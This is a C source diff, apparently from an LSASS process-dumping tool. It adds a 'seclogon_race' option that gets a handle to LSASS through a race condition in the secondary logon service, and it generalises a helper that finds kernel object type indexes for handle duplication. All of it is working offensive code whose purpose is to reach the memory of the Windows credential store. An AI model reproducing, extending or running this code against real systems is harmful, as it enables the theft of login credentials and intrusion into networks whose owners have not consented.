@@ -48,6 +48,7 @@ HANDLE obtain_lsass_handle(
     IN DWORD lsass_pid,
     IN DWORD permissions,
     IN BOOL dup,
+    IN BOOL seclogon_race,
     IN BOOL is_malseclogon_stage_2,
     IN LPCSTR dump_path)
 {
@@ -68,6 +69,10 @@ HANDLE obtain_lsass_handle(
         hProcess = duplicate_lsass_handle(
             lsass_pid,
             permissions);
+    }
+    else if (seclogon_race)
+    {
+        hProcess = malseclogon_race_condition(lsass_pid);
     }
     // good old NtOpenProcess
     else if (lsass_pid)
@@ -300,7 +305,6 @@ POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(VOID)
 
         if (NT_SUCCESS(status))
         {
-            DPRINT("Obtained the different types of objects");
             return obj_type_information;
         }
 
@@ -314,6 +318,7 @@ POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(VOID)
 
 // get index of object type 'Process'
 BOOL GetTypeIndexByName(
+    IN LPWSTR handle_type,
     OUT PULONG ProcesTypeIndex)
 {
     POBJECT_TYPES_INFORMATION ObjectTypes;
@@ -329,10 +334,10 @@ BOOL GetTypeIndexByName(
     CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
     for (ULONG i = 0; i < ObjectTypes->NumberOfTypes; i++)
     {
-        if (!_wcsicmp(CurrentType->TypeName.Buffer, PROCESS_TYPE))
+        if (!_wcsicmp(CurrentType->TypeName.Buffer, handle_type))
         {
             *ProcesTypeIndex = i + 2;
-            DPRINT("Found the index of type 'Process': %ld", i+2);
+            DPRINT("Found the index of type '%ls': %ld", handle_type, i+2);
             intFree(ObjectTypes); ObjectTypes = NULL;
             return TRUE;
         }
@@ -352,7 +357,7 @@ HANDLE duplicate_lsass_handle(
     BOOL success;
 
     ULONG ProcesTypeIndex = 0;
-    success = GetTypeIndexByName(&ProcesTypeIndex);
+    success = GetTypeIndexByName(PROCESS_HANDLE_TYPE, &ProcesTypeIndex);
     if (!success)
         return NULL;
 
